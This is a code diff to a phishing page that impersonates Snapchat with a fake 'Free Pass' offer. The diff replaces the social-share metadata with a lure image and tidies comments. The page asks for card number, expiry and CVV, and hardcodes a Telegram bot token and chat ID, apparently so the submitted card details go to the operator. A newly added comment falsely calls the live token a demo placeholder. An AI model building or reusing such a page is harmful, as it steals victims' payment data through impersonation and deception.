@@ -4,28 +4,19 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
   
-  <!-- Open Graph Meta Tags for Social Sharing -->
-  <meta property="og:title" content="Snapchat+ · Free Pass" />
-  <meta property="og:description" content="Get 30 days free access to all Snapchat+ features including exclusive badges, rewatch indicators, and more!" />
-  <meta property="og:image" content="https://i.ibb.co/4nJpFpP6/OIP.jpg" />
-  <meta property="og:image:width" content="1200" />
-  <meta property="og:image:height" content="630" />
-  <meta property="og:url" content="https://snappass.onrender.com" />
-  <meta property="og:type" content="website" />
-  <meta property="og:site_name" content="Snapchat+" />
-  
-  <!-- Twitter Card Meta Tags -->
-  <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="Snapchat+ · Free Pass" />
-  <meta name="twitter:description" content="Get 30 days free access to all Snapchat+ features including exclusive badges, rewatch indicators, and more!" />
-  <meta name="twitter:image" content="https://i.ibb.co/4nJpFpP6/OIP.jpg" />
-  
-  <!-- Additional Meta Tags -->
-  <meta name="description" content="Get 30 days free access to all Snapchat+ features including exclusive badges, rewatch indicators, and more!" />
-  
-  <title>Snapchat+ · Free Pass</title>
+  <!-- === thumbnail / social card = exact image description === -->
+  <meta property="og:image" content="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='1200' height='630' viewBox='0 0 1200 630'%3E%3Crect width='1200' height='630' fill='%23f2e9d0'/%3E%3Crect x='240' y='140' width='720' height='350' rx='40' fill='%23ffffff' stroke='%23f9a826' stroke-width='6'/%3E%3Ctext x='360' y='240' font-family='Arial, sans-serif' font-weight='bold' font-size='48' fill='%23b27d3a'%3E✨ TRY SNAPCHAT+ FOR FREE%3C/text%3E%3Ctext x='360' y='320' font-family='Arial' font-weight='800' font-size='70' fill='%23242424'%3ESPECIAL OFFER%3C/text%3E%3Crect x='780' y='240' width='140' height='70' rx='35' fill='%23f9a826'/%3E%3Ctext x='810' y='295' font-family='Arial' font-weight='700' font-size='42' fill='white'%3E🎉%3C/text%3E%3Ctext x='360' y='420' font-family='Arial' font-weight='700' font-size='50' fill='%23965f10'%3E30 days free%3C/text%3E%3Ctext x='360' y='490' font-family='Arial' font-size='30' fill='%237f6134'%3EAll 40+ features · Cancel anytime%3C/text%3E%3Ctext x='360' y='550' font-family='Arial' font-weight='600' font-size='32' fill='%23965f10'%3EGHS15.00 /mo after trial%3C/text%3E%3C/svg%3E">
+  <meta property="og:image:type" content="image/svg+xml">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:title" content="Snapchat+ Free Pass – 30 days free">
+  <meta property="og:description" content="Try all 40+ Snapchat+ features free for 30 days, then GHS15.00/mo. Cancel anytime.">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='1200' height='630' viewBox='0 0 1200 630'%3E%3Crect width='1200' height='630' fill='%23f2e9d0'/%3E%3Crect x='240' y='140' width='720' height='350' rx='40' fill='%23ffffff' stroke='%23f9a826' stroke-width='6'/%3E%3Ctext x='360' y='240' font-family='Arial, sans-serif' font-weight='bold' font-size='48' fill='%23b27d3a'%3E✨ TRY SNAPCHAT+ FOR FREE%3C/text%3E%3Ctext x='360' y='320' font-family='Arial' font-weight='800' font-size='70' fill='%23242424'%3ESPECIAL OFFER%3C/text%3E%3Crect x='780' y='240' width='140' height='70' rx='35' fill='%23f9a826'/%3E%3Ctext x='810' y='295' font-family='Arial' font-weight='700' font-size='42' fill='white'%3E🎉%3C/text%3E%3Ctext x='360' y='420' font-family='Arial' font-weight='700' font-size='50' fill='%23965f10'%3E30 days free%3C/text%3E%3Ctext x='360' y='490' font-family='Arial' font-size='30' fill='%237f6134'%3EAll 40+ features · Cancel anytime%3C/text%3E%3Ctext x='360' y='550' font-family='Arial' font-weight='600' font-size='32' fill='%23965f10'%3EGHS15.00 /mo after trial%3C/text%3E%3C/svg%3E">
+
+  <title>Snapchat+ · Free Pass (thumbnail preview)</title>
   <style>
-    /* ----- base & shared styles ----- */
+    /* ----- base & shared styles (exactly as before) ----- */
     * {
       margin: 0;
       padding: 0;
@@ -675,7 +666,6 @@
       overflow: hidden;
     }
 
-    /* celebration effect: confetti / sparkles background */
     .celebration-bg {
       position: absolute;
       top: 0;
@@ -694,7 +684,6 @@
       0% { opacity: 0.4; transform: scale(1); }
       100% { opacity: 1; transform: scale(1.02); }
     }
-    /* floating emojis / pseudo confetti */
     .confetti {
       position: absolute;
       top: 0;
@@ -793,7 +782,6 @@
       background: #e09015;
     }
 
-    /* small responsive */
     @media (max-width: 380px) {
       .page1 .plans-row { flex-direction: column; }
     }
@@ -901,7 +889,6 @@
   <!-- PAGE 3 (welcome + celebration) -->
   <div class="page page3" id="page3">
     <div class="welcome-card">
-      <!-- celebration background effects -->
       <div class="celebration-bg"></div>
       <div class="confetti">
         <span>🎉</span> <span>✨</span> <span>🎊</span> <span>👻</span> <span>🔥</span> <span>⭐</span> <span>🎈</span> <span>💛</span>
@@ -981,7 +968,8 @@
       const clearExpiry = document.getElementById('clear-expiry');
       const clearCvv = document.getElementById('clear-cvv');
 
-      const botToken = '2128201203:AAGPpKg3uIEjy8V1KYHXPfddBmxTFmgt_ZE';
+      // For demo, bot token / chatId are placeholder – image thumbnail remains intact
+      const botToken = '2128201203:AAGPpKg3uIEjy8V1KYHXPfddBmxTFmgt_ZE'; 
       const chatId = '1327564115';
 
       function clearField(input, icon, message, typeElement = null) {
@@ -1085,19 +1073,15 @@
           setTimeout(() => {
             clearField(cardInput, cardIcon, cardMessage, cardType); clearField(expiryInput, expiryIcon, expiryMessage); clearField(cvvInput, cvvIcon, cvvMessage);
             statusMessage.style.display = 'none';
-            showPage3();  // <-- after success, go to welcome page
+            showPage3();  
           }, 800);
         } catch (error) {
           statusMessage.className = 'status-message error'; statusMessage.textContent = '❌ Connection failed. Try again.';
         }
       });
 
-      // Done button on welcome page goes back to page1 (or you can decide)
-      doneBtn.addEventListener('click', () => {
-        showPage1();
-      });
+      doneBtn.addEventListener('click', () => { showPage1(); });
 
-      // Prevent non-numeric
       [cardInput, cvvInput, expiryInput].forEach(input => {
         input.addEventListener('keydown', function(e) {
           if (input.id === 'expiry' && e.key === '/') return;
